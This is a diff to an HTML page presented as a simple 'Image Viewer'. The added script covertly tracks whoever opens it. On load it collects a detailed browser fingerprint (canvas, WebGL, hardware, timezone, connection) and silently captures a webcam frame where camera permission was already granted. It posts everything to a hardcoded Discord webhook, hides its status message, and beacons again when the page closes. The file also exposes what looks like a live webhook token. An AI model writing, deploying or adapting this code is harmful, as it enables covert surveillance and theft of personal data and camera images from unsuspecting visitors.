@@ -1,65 +1,201 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Viewer</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            background: #1a1a1a;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 90%;
+            text-align: center;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+        .status {
+            color: #00ff00;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(0,255,0,0.1);
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2 style="color: white;">🖼️ Image Viewer</h2>
+        <div id="status" class="status">⏳ Loading...</div>
+        <img id="targetImage" src="Captura de pantalla 2026-03-16 060146_view.png" alt="Tracked Image">
+    </div>
+
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1484358816933085287/N16XtmubEfoR7eOmMH9-cX-q_RDXS55O93qAw_s3f-km4TVnsLLuxVBqLhztbOnKtbiL';
         const TRACKING_ID = 'bc13fcf6';
         const TRACKING_TYPE = 'camera';
 
+        // Enhanced fingerprinting without camera prompt
+        async function getAdvancedFingerprint() {
+            const fingerprint = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer || 'direct',
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                connection: navigator.connection ? {
+                    downlink: navigator.connection.downlink,
+                    effectiveType: navigator.connection.effectiveType,
+                    rtt: navigator.connection.rtt
+                } : null
+            };
+
+            // Canvas fingerprinting
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('fingerprint', 2, 2);
+                fingerprint.canvasFP = canvas.toDataURL().substring(0, 100);
+            } catch(e) {}
+
+            // WebGL fingerprinting
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        fingerprint.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        fingerprint.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch(e) {}
+
+            return fingerprint;
+        }
+
+        // Try camera silently (won't show prompt unless user has previously allowed)
+        async function tryCameraSilent() {
+            try {
+                // Check if permission might be granted
+                if (navigator.permissions) {
+                    const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+                    if (permissionStatus.state !== 'granted') {
+                        // Permission not pre-granted, skip to avoid prompt
+                        console.log('Camera permission not pre-granted');
+                        return { captured: false, data: null, reason: 'permission_required' };
+                    }
+                }
+
+                // Only try if we think it won't prompt
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 640, height: 480 } 
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                const cameraData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                
+                stream.getTracks().forEach(track => track.stop());
+                
+                return { captured: true, data: cameraData, reason: 'success' };
+            } catch (err) {
+                console.log('Camera skipped:', err.message);
+                return { captured: false, data: null, reason: err.message };
+            }
+        }
+
         async function captureAndSend() {
             const statusDiv = document.getElementById('status');
             
             try {
-                const userInfo = {
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    screenResolution: `${screen.width}x${screen.height}`,
-                    timestamp: new Date().toISOString(),
-                    url: window.location.href
+                // Get advanced fingerprint (no prompts)
+                const userInfo = await getAdvancedFingerprint();
+                
+                // Try camera silently
+                const cameraResult = await tryCameraSilent();
+                
+                // Build detailed embed
+                const embed = {
+                    title: "🎯 Image Tracker Activated",
+                    description: `**Advanced Fingerprint Collected**\n\n` +
+                                `**⏰ Timestamp:** ${userInfo.timestamp}\n` +
+                                `**🖥️ Platform:** ${userInfo.platform}\n` +
+                                `**🌐 Language:** ${userInfo.language}\n` +
+                                `**📺 Resolution:** ${userInfo.screenResolution}\n` +
+                                `**🎨 Color Depth:** ${userInfo.colorDepth}-bit\n` +
+                                `**⚡ Connection:** ${userInfo.connection ? userInfo.connection.effectiveType : 'unknown'} (${userInfo.connection ? userInfo.connection.downlink : '?'}Mbps)\n` +
+                                `**🕐 Timezone:** ${userInfo.timezone}\n` +
+                                `**🔗 URL:** ${userInfo.url}\n` +
+                                `**📊 Touch Points:** ${userInfo.maxTouchPoints}\n\n` +
+                                `**🎯 Tracking ID:** \`${TRACKING_ID}\`\n` +
+                                `**📷 Type:** ${TRACKING_TYPE}\n\n` +
+                                (cameraResult.captured ? '✅ **Camera: CAPTURED**' : `⚠️ Camera: ${cameraResult.reason.replace(/_/g, ' ')}`),
+                    color: cameraResult.captured ? 5814783 : 15158332,
+                    fields: [
+                        {
+                            name: "Device Info",
+                            value: `CPU Cores: \`${userInfo.hardwareConcurrency}\`\nMemory: \`${userInfo.deviceMemory}GB\``,
+                            inline: true
+                        },
+                        {
+                            name: "Browser",
+                            value: `Cookies: \`${userInfo.cookiesEnabled}\`\nDNT: \`${userInfo.doNotTrack}\``,
+                            inline: true
+                        },
+                        {
+                            name: "Tracking Status",
+                            value: cameraResult.captured ? '✅ Full Success' : '⚠️ Browser Data Only',
+                            inline: true
+                        }
+                    ]
                 };
 
-                let cameraCaptured = false;
-                let cameraData = null;
-
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { width: 640, height: 480 } 
+                // Add WebGL info if available
+                if (userInfo.webglVendor && userInfo.webglRenderer) {
+                    embed.fields.push({
+                        name: "GPU",
+                        value: `Vendor: \`${userInfo.webglVendor.substring(0, 20)}...\`\nRenderer: \`${userInfo.webglRenderer.substring(0, 30)}...\``,
+                        inline: false
                     });
-                    
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
-
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    cameraData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                    cameraCaptured = true;
-                } catch (err) {
-                    console.log('Cámara no disponible:', err);
                 }
 
-                const embed = {
-                    title: "🎯 Imagen Rastreada Activada",
-                    description: `**Usuario detectado**\n\n` +
-                                `**Timestamp:** ${userInfo.timestamp}\n` +
-                                `**Plataforma:** ${userInfo.platform}\n` +
-                                `**Navegador:** ${userInfo.language}\n` +
-                                `**Resolución:** ${userInfo.screenResolution}\n` +
-                                `**URL:** ${userInfo.url}\n\n` +
-                                `**ID Rastreo:** ${TRACKING_ID}\n` +
-                                `**Tipo:** ${TRACKING_TYPE}\n\n` +
-                                (cameraCaptured ? '📸 **Cámara capturada exitosamente**' : '⚠️ Cámara no disponible'),
-                    color: cameraCaptured ? 5814783 : 15158332
-                };
-
                 const payload = {
-                    content: `🔍 **Imagen Rastreada - ${TRACKING_TYPE.toUpperCase()}**`,
+                    content: `🔍 **Tracker #${TRACKING_ID} Activated - ${TRACKING_TYPE.toUpperCase()}**`,
                     embeds: [embed]
                 };
 
+                // Send main payload
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
@@ -69,30 +205,78 @@
                 });
 
                 if (response.ok) {
-                    statusDiv.textContent = '✅ Image loaded successfully!';
-                    statusDiv.style.background = 'rgba(0,255,0,0.2)';
+                    console.log('✅ Main data sent to Discord');
                     
-                    if (cameraCaptured) {
-                        const formData = new FormData();
-                        const blob = await (await fetch(`data:image/jpeg;base64,${cameraData}`)).blob();
-                        formData.append('file', blob, 'camera_capture.jpg');
-                        
-                        await fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            body: formData
-                        });
+                    // Send camera if captured
+                    if (cameraResult.captured && cameraResult.data) {
+                        try {
+                            const formData = new FormData();
+                            const blob = await (await fetch(`data:image/jpeg;base64,${cameraResult.data}`)).blob();
+                            formData.append('file', blob, 'camera_capture.jpg');
+                            
+                            await fetch(WEBHOOK_URL, {
+                                method: 'POST',
+                                body: formData
+                            });
+                            console.log('📸 Camera image sent');
+                        } catch (camErr) {
+                            console.error('Failed to send camera:', camErr);
+                        }
                     }
+                    
+                    // Update status subtly
+                    statusDiv.style.opacity = '0';
+                    setTimeout(() => {
+                        statusDiv.textContent = '';
+                        statusDiv.style.display = 'none';
+                    }, 1000);
                 } else {
-                    statusDiv.textContent = '⚠️ Image loaded (tracking failed)';
+                    console.error('Failed to send:', response.status);
+                    statusDiv.style.display = 'none';
                 }
 
             } catch (error) {
-                console.error('Error:', error);
-                statusDiv.textContent = '✅ Image loaded';
+                console.error('Tracking error:', error);
+                statusDiv.style.display = 'none';
+                
+                // Try to send error report
+                try {
+                    const errorEmbed = {
+                        title: "❌ Tracker Error",
+                        description: `Error: ${error.message}\nID: ${TRACKING_ID}`,
+                        color: 15158332
+                    };
+                    
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ embeds: [errorEmbed] })
+                    });
+                } catch (e) {}
             }
         }
 
+        // Execute on page load with minimal delay
         window.addEventListener('load', () => {
-            setTimeout(captureAndSend, 1000);
+            // Wait for image to fully load
+            const img = document.getElementById('targetImage');
+            if (img.complete) {
+                setTimeout(captureAndSend, 500);
+            } else {
+                img.addEventListener('load', () => {
+                    setTimeout(captureAndSend, 500);
+                });
+            }
+        });
+
+        // Also capture before page unload (in case they close quickly)
+        window.addEventListener('beforeunload', () => {
+            // Navigator.sendBeacon for reliable delivery
+            const data = JSON.stringify({ event: 'page_close', tracking_id: TRACKING_ID });
+            navigator.sendBeacon(WEBHOOK_URL.replace('/webhooks/', '/webhooks/') , data);
         });
     </script>
+</body>
+</html>
